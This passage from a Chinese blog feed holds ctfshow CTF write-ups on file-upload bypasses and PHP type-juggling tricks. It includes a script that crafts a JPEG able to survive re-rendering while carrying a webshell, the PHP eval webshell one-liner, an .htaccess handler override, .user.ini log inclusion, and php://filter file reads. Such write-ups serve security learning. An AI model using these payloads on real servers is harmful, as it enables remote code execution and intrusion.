class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用法：  php exp.php a.jpg</span><br></pre></td></tr></table></figure><p>然后就会生成一个渲染后的jpg文件。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225203021359.png" alt="image-20221225203021359"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225203058469.png" alt="image-20221225203058469"></p><p>这是里面的木马。</p><p>然后进行抓包rce就行了。</p><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225211902666.png" alt="image-20221225211902666"></p><p>这道题是一道zip类型类型的题目，就是上传文件只能上传zip类型的，然后我们就去本地找一张图片，然后就去转化为zip类型并且上传，并且在zip里写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>然后就进行上传。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225212120262.png" alt="image-20221225212120262"></p><p>上传成功后就把request 请求改成POST，刚开始我就是这里没改，找了半天问题。</p><p>然后就可以进行rce了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225212238112.png" alt="image-20221225212238112"></p><h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225230535662.png" alt="image-20221225230535662"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231006048.png" alt="image-20221225231006048"></p><p>题目给了这个东西是与.htaccess有关的，所以这道题是得用到.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;normal_up.jpg&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>上面的文件名是，等会要上传的文件。</p><p><strong>第一步</strong></p><p>先上传一个jpg文件，然后把文件名和文件内容全部改掉，文件名改成.htaccess，文件内容改成上面的代码。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231330037.png" alt="image-20221225231330037"></p><p><strong>第二步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231346882.png" alt="image-20221225231346882"></p><p><strong>第三步</strong></p><p>访问上传图片的地址，然后进行rce</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231418066.png" alt="image-20221225231418066"></p><h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225233316993.png" alt="image-20221225233316993"></p><p>这道题的坑是在它给的上传目录是没有包含upload的，就是直接访问图片名的话，就是会报错。</p><p>知道这里以后就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接就先上传一个png图片，然后就修改图片内容和后缀就可以了。</span><br></pre></td></tr></table></figure><p>然后访问/upload/图片名    就可进行rce了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225234159992.png" alt="image-20221225234159992"></p><h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225234946679.png" alt="image-20221225234946679"></p><p>这道题把  &lt;   给过滤掉了，那么php脚本的话，必须得包含它，那么我们就得换另一种形式了，就是包含日志，那么包含日志的话，得需要一个前提就是得有默认文件<strong>index.php</strong></p><p>但是这道题没有，那么我们就得进行构造index.php了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153025708.png" alt="image-20221226153025708"></p><p>成功上传index.php</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153057506.png" alt="image-20221226153057506"></p><p>然后利用.user.ini上传日志包含</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153313062.png" alt="image-20221226153313062"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153332634.png" alt="image-20221226153332634"></p><p>发现测试成功，然后就可以进行读取flag了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153612103.png" alt="image-20221226153612103"></p><p>这里得进行抓包读取，浏览器查看的话，看不出来。</p><h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>源码</p><p><img src="\images\image-20221226153716031.png" alt="image-20221226153716031"></p><p>这题和上一题的解法一模一样，就不多说了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文件上传检测有三个&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;文件名&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件类型&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件内容&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;web151&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="ctfshow 文件上传 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-PHP特性 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/94c13720.html"/>
    <id>https://ke1nys.github.io/posts/94c13720.html</id>
    <published>2022-12-18T13:07:36.000Z</published>
    <updated>2022-12-24T11:56:48.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211029898.png" alt="image-20221218211029898"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211208944.png" alt="image-20221218211208944"></p><p>利用数组绕过，对num的正则匹配。</p><p>因为    ——&gt;<strong>preg_match只能处理字符串，当传入的subject是数组时会返回false</strong></p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211321940.png" alt="image-20221218211321940"></p><p>先解释一下<code>intval</code>的意思</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211520421.png" alt="image-20221218211520421"></p><p>然后这道题就可以通过数字加字母绕过。    <strong><!--也可以使用16进制绕过    ---->   num=0x117c—&gt;</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211550102.png" alt="image-20221218211550102"></p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218212029537.png" alt="image-20221218212029537"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218212822855.png" alt="image-20221218212822855"></p><p>这里解释了<code>^php$/im</code>的意思     m是多行匹配的意思</p><p>^    —-&gt;是指仅匹配/p开头的字符串</p><p>$    —-&gt;是指仅匹配/p结尾的字符串</p><p><a href="https://bbs.csdn.net/topics/320227966">https://bbs.csdn.net/topics/320227966</a></p><p>这篇文章讲解了php正则遇到的所有符号的含义</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218213049399.png" alt="image-20221218213049399"></p><!--为什么可以这样写拿到flag呢，因为第一个if是多行匹配，然后就会形成回车  php,然后就会检索第一行，发现没有php后会接着检索第二行，但是第二个if的话，就是单行匹配，只会匹配到回车符号，然后就结束了，不会接着匹配下一行的php--><p> <code>%0aphp</code>是这样的</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218213434661.png" alt="image-20221218213434661"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214708879.png" alt="image-20221218214708879"></p><p>用4476的16进制或者8进制都能绕过</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214745883.png" alt="image-20221218214745883"></p><p><strong>解法2：</strong></p><p><code>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</code></p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214938240.png" alt="image-20221218214938240"></p><p>虽然过滤了字母   我们还可以用8进制表示</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215152296.png" alt="image-20221218215152296"></p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215237018.png" alt="image-20221218215237018"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215849892.png" alt="image-20221218215849892"></p><p>先用4476_过滤掉第一个和第二个if，因为第三个函数要求参数里必须得有0，所以在末尾加一个0，就能成功绕过了。</p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220051775.png" alt="image-20221218220051775"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220710727.png" alt="image-20221218220710727"></p><p>加号或者空格都能绕过     这两个的url编码也能绕过。</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220854093.png" alt="image-20221218220854093"></p><p> <strong>解法一</strong></p><p>利用php为协议</p><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151615862.png" alt="image-20221219151615862"></p><p><strong>解法二</strong></p><p><code>./</code>代表当前目录下  所以</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151722800.png" alt="image-20221219151722800"></p><p><strong>解法三</strong></p><p>利用当前目录的路径</p><p><code>/var/www/html</code></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151841812.png" alt="image-20221219151841812"></p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152132776.png" alt="image-20221219152132776"></p><p>利用数组绕过md5强等于</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152207405.png" alt="image-20221219152207405"></p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152512769.png" alt="image-20221219152512769"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219155526819.png" alt="image-20221219155526819"></p><p>这道题考察的是一个三元运算符</p><!--if(条件)?true:false-->     就是条件成立的话返回true里的值     不成立的返回false里的值首先先分析代码，$_GET如果刚开始没赋值的话就会被强制转换为一个字符串，那么下面的条件都不会成立了，因为$__GET必须得是个数组才能拿到flag,**第一步**得先给GET随便传点值让其为true使其返回```$_GET=&$_POST```变成post型的数组，然后下一行的$_GET就会变成$__POST。**第二步**然后给POST的flag传值为flag，使其转为COOKIE,那么第三行的$__GET就会变成$—COOKIE ，又因为COOKIE的flag没有没有值，就会返回flag，而不是SERVER。**最后一步**所以最后一行的GET就为CCOKIE了，最后只要在COOKIE里添加HTTP_FLAG=flag就可以成功输出flag了## web99源码![image-20221219160616968](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219160616968.png)array_push()   --->的意思是靠rand(1,$i)在1到$i之间产生的随机数，然后赋值到$allow尾部里in_array()   ----> 判断$_GET里的值是否在$allow里这道题就存在这个漏洞在这里。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163711057.png" alt="image-20221219163711057"></p><p>所以就可以利用这个漏洞。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163915275.png" alt="image-20221219163915275"></p><p>先看数组里有没有3这个数字，有的话看能不能写入东西。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163942094.png" alt="image-20221219163942094"></p><p>能写入，然后就可以进行getshell了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在content处写入   &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219164220854.png" alt="image-20221219164220854"></p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219164409059.png" alt="image-20221219164409059"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题先看$v0那里，是赋值和逻辑运算符相加在一起，但是逻辑运算符的的优先级没有赋值的高，所以这里只需要看v1就行，后面的不一定得是数字了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219171715178.png" alt="image-20221219171715178"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为v2不能带;，所以用?&gt;把它给替换掉了 %23是#号，把后面的东西给过滤掉了。v2就是传一句话木马，为什么可以这样写呢，就是eval比较特殊，他是这样的&lt;?php  所以我们前面加的?&gt;是为了与它闭合</span><br><span class="line"> ctfshow.php是/var/www/html目录下的   因为flag36d.txt是假的flag.</span><br></pre></td></tr></table></figure><p>0x2d   —-&gt;   指的是-     替换后以ctfshow{xxxx}提交就行</p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219172440204.png" alt="image-20221219172440204"></p><p>这道题考察的是反射类的含义，我也不太懂。。。。。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219205625421.png" alt="image-20221219205625421"></p><p>因为flag一般是uuid的，有16位ui，这才有15位，所以得加一个在最后一个位置上   <strong>0-f</strong></p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219205806760.png" alt="image-20221219205806760"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题的难点是如何构造v2,看了题目给的解后才发现</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223237023.png" alt="image-20221219223237023"></p><p>它这个构造就很巧妙了，因为这个e可以当作科学计数法来看，所以刚好符合题目要求。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223434325.png" alt="image-20221219223434325"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223442861.png" alt="image-20221219223442861"></p><p>这个就是先进行base64编码，然后在进行16进制转换得到的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个前面构造的16进制前面的数字相当于0x，可以不要，去掉也不影响，所以为了能绕过，就给0x替换成11了.</span><br></pre></td></tr></table></figure><p>因为题目给的substr会把前两位给去掉，所以不影响最终结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后v3传的php伪协议是解码的，所以是先进行16进制转换，然后在进行base64解码，然后写入2.php里。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219224415157.png" alt="image-20221219224415157"></p><p>访问2.php得到flag。</p><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219225709345.png" alt="image-20221219225709345"></p><p>和上一题的解法一样</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219230835495.png" alt="image-20221219230835495"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219230941622.png" alt="image-20221219230941622"></p><p>和md5差不多，都是加密函数</p><p>也可以利用数组绕过。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219231030575.png" alt="image-20221219231030575"></p><p>直接令值相等也行。</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219234917550.png" alt="image-20221219234917550"></p><p>foreach里面指的就是这个  —-&gt; $_GET[key]=value</p><p><script type="math/tex">key=</script>value;   ——- &gt;这个是值覆盖</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219235048002.png" alt="image-20221219235048002"></p><p>自己看pl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一步，suces=flag的原因是为了绕过第一行的foreach里面的die()，所以利用了suces,然后根据值覆盖，suces就等于$flag.然后第二个post的话，就是为了绕过die()，然后进行值覆盖，那么error就等于$flag了，然后因为没有post flag,所以执行die($error)就等于die($flag).然后就会输出flag.</span><br></pre></td></tr></table></figure><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143719767.png" alt="image-20221220143719767"></p><p>这道题可以利用数组绕过</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143807143.png" alt="image-20221220143807143"></p><p>这样就可以拿到flag.</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143934377.png" alt="image-20221220143934377"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145147822.png" alt="image-20221220145147822"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路就是给v1随便给个值，因为找不到flag这个key，所以会返回false,然后md5传一个数组，md5也不会解析数组，也会返回false.所以相等，然后就会输出flag.</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145531165.png" alt="image-20221220145531165"></p><p>这就是官方解，给的数字的含义。</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128144485">https://blog.csdn.net/qq_63548648/article/details/128144485</a>    可以看下我写的</p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145632097.png" alt="image-20221220145632097"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220154959505.png" alt="image-20221220154959505"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00是一个截断字符，就是代表着一个字符串到这就结束了，后面的东西将不会在继续遍历了。</span><br></pre></td></tr></table></figure><p>所以第一个if就是一个以a开头并且以a结尾的一个字符串。然后因为36d转为10进制是877，然后根据题目给的逆转函数就得输入778，然后函数逆转就可以等于36d了。</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p>源码</p><p><img 